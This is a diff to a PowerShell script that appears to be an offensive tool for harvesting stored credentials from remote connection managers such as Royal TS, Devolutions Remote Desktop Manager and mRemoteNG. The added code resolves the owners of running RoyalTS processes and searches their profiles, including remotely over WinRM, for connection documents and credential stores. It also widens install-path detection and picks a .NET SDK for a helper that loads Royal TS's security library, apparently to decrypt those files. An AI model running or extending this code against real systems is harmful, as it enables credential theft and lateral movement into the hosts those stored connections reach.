@@ -62,8 +62,12 @@ $targets = @(
         Vendor   = 'Royal Apps'
         Procs    = @('RoyalTS')
         Paths    = @(
+            "$env:ProgramFiles\Royal TS V5\RoyalTS.exe",
+            "$env:ProgramFiles\Royal TS V6\RoyalTS.exe",
             "$env:ProgramFiles\Royal TS V7\RoyalTS.exe",
             "$env:ProgramFiles\Royal TS V8\RoyalTS.exe",
+            "${env:ProgramFiles(x86)}\Royal TS V5\RoyalTS.exe",
+            "${env:ProgramFiles(x86)}\Royal TS V6\RoyalTS.exe",
             "${env:ProgramFiles(x86)}\Royal TS V7\RoyalTS.exe"
         )
         DataFiles = @(
@@ -365,9 +369,55 @@ public class RCMWinApi {
                     Write-Host "          Doc     : $mp (from memory)" -ForegroundColor Magenta
                 }
             }
+
+            # Fallback: scan Royal TS config files for recently opened documents (works over WinRM)
+            if ($docNames.Count -eq 0 -and $memPaths.Count -eq 0 -and $t.Procs[0] -eq 'RoyalTS') {
+                $configDirs = @()
+                foreach ($rp in $runProcs) {
+                    try {
+                        $oi = Invoke-CimMethod -InputObject $rp -MethodName GetOwner -ErrorAction SilentlyContinue
+                        if ($oi.User) {
+                            $configDirs += "C:\Users\$($oi.User)\AppData\Roaming\code4ward\Settings\Documents"
+                            $configDirs += "C:\Users\$($oi.User)\AppData\Local\Royal TS"
+                        }
+                    } catch {}
+                }
+                $configDirs += "$env:APPDATA\code4ward\Settings\Documents"
+                $configDirs += "$env:LOCALAPPDATA\Royal TS"
+                foreach ($cd in ($configDirs | Select-Object -Unique)) {
+                    if (-not (Test-Path $cd)) { continue }
+                    Get-ChildItem $cd -Filter "*.json" -ErrorAction SilentlyContinue | ForEach-Object {
+                        try {
+                            $json = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json -ErrorAction SilentlyContinue
+                            if ($json.ConnectionsToRestore) {
+                                foreach ($conn in $json.ConnectionsToRestore) {
+                                    if ($conn -and $conn -match '\.rtsz') {
+                                        Write-Host "          Doc     : $conn (from config)" -ForegroundColor Magenta
+                                    }
+                                }
+                            }
+                        } catch {}
+                    }
+                    Get-ChildItem $cd -Filter "*.rtsz" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+                        Write-Host "          Doc     : $($_.FullName) (from config dir)" -ForegroundColor Magenta
+                    }
+                }
+                # Also scan command line of the process for .rtsz paths
+                foreach ($rp in $runProcs) {
+                    try {
+                        $cmdLine = $rp.CommandLine
+                        if ($cmdLine) {
+                            $rtszMatches = [regex]::Matches($cmdLine, '(?:[A-Za-z]:\\|\\\\)[^\s"]+\.rtsz')
+                            foreach ($rm in $rtszMatches) {
+                                Write-Host "          Doc     : $($rm.Value) (from cmdline)" -ForegroundColor Magenta
+                            }
+                        }
+                    } catch {}
+                }
+            }
         }
 
-        # Check data files
+        # Check data files (current user paths)
         foreach ($df in $t.DataFiles) {
             $matches = @()
             if ($df.Path -like 'HKCU:*' -or $df.Path -like 'HKLM:*') {
@@ -382,6 +432,38 @@ public class RCMWinApi {
                 }
                 Write-Host "          Data    : $($df.Desc) -> $m$sz" -ForegroundColor DarkGray
                 $dataFound += $m
+            }
+        }
+
+        # If running, also scan process owner's profile (useful over WinRM where $env:USERPROFILE != process owner)
+        if ($running) {
+            $ownerProfiles = @()
+            foreach ($rp in $runProcs) {
+                try {
+                    $oi = Invoke-CimMethod -InputObject $rp -MethodName GetOwner -ErrorAction SilentlyContinue
+                    if ($oi.User) {
+                        $profPath = "C:\Users\$($oi.User)"
+                        if ((Test-Path $profPath) -and $profPath -ne $env:USERPROFILE -and $ownerProfiles -notcontains $profPath) {
+                            $ownerProfiles += $profPath
+                        }
+                    }
+                } catch {}
+            }
+            foreach ($prof in $ownerProfiles) {
+                $searchPaths = @("$prof\Documents\*.rtsz", "$prof\Desktop\*.rtsz", "$prof\Downloads\*.rtsz",
+                                 "$prof\AppData\Local\Devolutions\RemoteDesktopManager\Connections.db",
+                                 "$prof\AppData\Roaming\mRemoteNG\confCons.xml")
+                foreach ($sp in $searchPaths) {
+                    $found2 = @(Resolve-Path $sp -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path)
+                    foreach ($f in $found2) {
+                        if ($f -notin $dataFound) {
+                            $sz = ""
+                            if (Test-Path $f -PathType Leaf) { $sz = " ($([math]::Round((Get-Item $f).Length / 1KB))KB)" }
+                            Write-Host "          Data    : $f$sz (owner profile)" -ForegroundColor Magenta
+                            $dataFound += $f
+                        }
+                    }
+                }
             }
         }
 
@@ -688,11 +770,22 @@ class Program
         New-Item -ItemType Directory -Force -Path $projectDir | Out-Null
         Remove-Item (Join-Path $projectDir "bin") -Recurse -Force -ErrorAction SilentlyContinue
         Remove-Item (Join-Path $projectDir "obj") -Recurse -Force -ErrorAction SilentlyContinue
+        # Auto-detect best .NET SDK available
+        $dotnetTfm = "net8.0"
+        try {
+            $sdkList = dotnet --list-sdks 2>$null
+            if ($sdkList -match '10\.') { $dotnetTfm = "net10.0" }
+            elseif ($sdkList -match '9\.') { $dotnetTfm = "net9.0" }
+            elseif ($sdkList -match '8\.') { $dotnetTfm = "net8.0" }
+            elseif ($sdkList -match '7\.') { $dotnetTfm = "net7.0" }
+            elseif ($sdkList -match '6\.') { $dotnetTfm = "net6.0" }
+        } catch {}
+        Write-Host "[*] Using .NET target: $dotnetTfm" -ForegroundColor DarkGray
         @"
 <Project Sdk="Microsoft.NET.Sdk">
   <PropertyGroup>
     <OutputType>Exe</OutputType>
-    <TargetFramework>net10.0</TargetFramework>
+    <TargetFramework>$dotnetTfm</TargetFramework>
     <Nullable>enable</Nullable>
   </PropertyGroup>
   <ItemGroup>
@@ -715,8 +808,12 @@ class Program
     } catch {}
     if (-not $rtInstallDir -or -not (Test-Path "$rtInstallDir\RoyalDocument.SecurityInterface.dll")) {
         $rtInstallDir = @(
+            "$env:ProgramFiles\Royal TS V5",
+            "$env:ProgramFiles\Royal TS V6",
             "$env:ProgramFiles\Royal TS V7",
             "$env:ProgramFiles\Royal TS V8",
+            "${env:ProgramFiles(x86)}\Royal TS V5",
+            "${env:ProgramFiles(x86)}\Royal TS V6",
             "${env:ProgramFiles(x86)}\Royal TS V7"
         ) | Where-Object { Test-Path "$_\RoyalDocument.SecurityInterface.dll" } | Select-Object -First 1
     }
@@ -731,6 +828,7 @@ class Program
     foreach ($line in $output) {
         $s = "$line"
         if ($s -match '^\[') { Write-Host $s -ForegroundColor DarkGray }
+        elseif ($s -match 'error|Error|FAILED|exception' -and -not $inResults) { Write-Host $s -ForegroundColor Red }
         if ($s -eq '##RESULTS_START##') { $inResults = $true; continue }
         if ($s -eq '##RESULTS_END##') { $inResults = $false; continue }
 
@@ -991,8 +1089,12 @@ if ($Mode -eq 'offline') {
 
         $rtInstall = $null
         $searchDirs = @(
+            "$env:ProgramFiles\Royal TS V5",
+            "$env:ProgramFiles\Royal TS V6",
             "$env:ProgramFiles\Royal TS V7",
             "$env:ProgramFiles\Royal TS V8",
+            "${env:ProgramFiles(x86)}\Royal TS V5",
+            "${env:ProgramFiles(x86)}\Royal TS V6",
             "${env:ProgramFiles(x86)}\Royal TS V7"
         )
         foreach ($d in $searchDirs) {
@@ -1028,7 +1130,7 @@ if ($Mode -eq 'offline') {
 <Project Sdk="Microsoft.NET.Sdk">
   <PropertyGroup>
     <OutputType>Exe</OutputType>
-    <TargetFramework>net10.0</TargetFramework>
+    <TargetFramework>net8.0</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
   </PropertyGroup>
   <ItemGroup>
